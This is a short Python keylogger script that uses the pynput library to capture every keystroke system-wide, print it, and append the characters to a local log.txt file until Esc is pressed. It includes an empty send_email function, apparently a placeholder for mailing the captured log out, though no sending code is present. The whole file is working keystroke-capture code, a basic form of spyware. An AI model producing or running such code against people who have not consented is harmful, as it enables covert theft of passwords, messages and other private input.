import pynput

from pynput.keyboard import Key, Listener




def send_email(filename, attachment, toaddr):
    pass


# global variable declaration for keylog
# count to check if key is pressed then written to, keys to hold the keys
count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count > 0:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            # getting rid of ' from the string
            k = str(key).replace("'", "")
            # getting rid of spaces
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

## on_press = key is press on_release = key is released
with Listener(on_press=on_press, on_release = on_release) as listener:
    listener.join()
